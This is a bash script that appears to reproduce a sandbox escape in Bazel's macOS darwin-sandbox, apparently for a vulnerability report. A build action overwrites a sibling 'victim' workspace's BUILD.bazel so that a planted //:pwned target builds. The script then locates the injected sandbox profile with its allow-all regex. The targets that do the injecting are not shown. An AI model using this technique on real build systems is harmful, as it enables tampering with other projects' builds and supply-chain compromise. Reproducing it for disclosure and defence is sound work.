#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="${ROOT}/workspace"
VICTIM="${ROOT}/victim-workspace"
RUNTIME="${ROOT}/runtime-impact"
VICTIM_BUILD="${VICTIM}/BUILD.bazel"
OUTPUT_USER_ROOT="${RUNTIME}/output_user_root"

resolve_bazel() {
  if [[ -n "${BAZEL:-}" ]]; then
    printf '%s\n' "${BAZEL}"
  elif command -v bazelisk >/dev/null 2>&1; then
    command -v bazelisk
  elif command -v bazel >/dev/null 2>&1; then
    command -v bazel
  else
    echo "Set BAZEL=/absolute/path/to/bazel or put bazel/bazelisk in PATH." >&2
    exit 1
  fi
}

BAZEL="$(resolve_bazel)"

reset_victim() {
  rm -rf "${RUNTIME}"
  mkdir -p "${RUNTIME}"
  cat > "${VICTIM_BUILD}" <<'EOF'
exports_files(["safe.txt"])
EOF
}

run_target() {
  local target="$1"

  (
    cd "${WORKSPACE}"
    "${BAZEL}" \
      --output_user_root="${OUTPUT_USER_ROOT}" \
      --batch \
      build \
      --spawn_strategy=darwin-sandbox \
      --sandbox_debug \
      --action_env=ESCAPE_TARGET="${VICTIM_BUILD}" \
      "${target}"
  )
}

bin_dir() {
  readlink "${WORKSPACE}/bazel-bin"
}

victim_build_should_fail() {
  (
    cd "${VICTIM}"
    if "${BAZEL}" --batch build //:pwned >"${RUNTIME}/victim-fail.log" 2>&1; then
      echo "victim build unexpectedly succeeded" >&2
      cat "${RUNTIME}/victim-fail.log" >&2
      exit 1
    fi
  )
}

victim_build_should_succeed() {
  (
    cd "${VICTIM}"
    "${BAZEL}" --batch build //:pwned
    cat bazel-bin/owned.txt
  )
}

reset_victim

echo "[1/6] victim baseline has no :pwned target"
victim_build_should_fail
grep -n "no such target '//:pwned'" "${RUNTIME}/victim-fail.log"

echo "[2/6] control sandboxed action cannot tamper with sibling workspace"
run_target //:control_impact
cat "$(bin_dir)/control_impact.txt"
grep -n 'exports_files' "${VICTIM_BUILD}"
victim_build_should_fail

echo "[3/6] injected sandboxed action overwrites victim BUILD.bazel"
run_target //:escape_impact
cat "$(bin_dir)/escape_impact.txt"
cat "${VICTIM_BUILD}"

echo "[4/6] later normal victim build now succeeds because of tampered BUILD"
victim_build_should_succeed

echo "[5/6] locating injected sandbox profile"
PROFILE="$(find "${OUTPUT_USER_ROOT}" -name sandbox.sb -print | sort | tail -n 1)"
echo "${PROFILE}"
grep -n 'regex ".*"' "${PROFILE}"

echo "[6/6] impact repro completed"
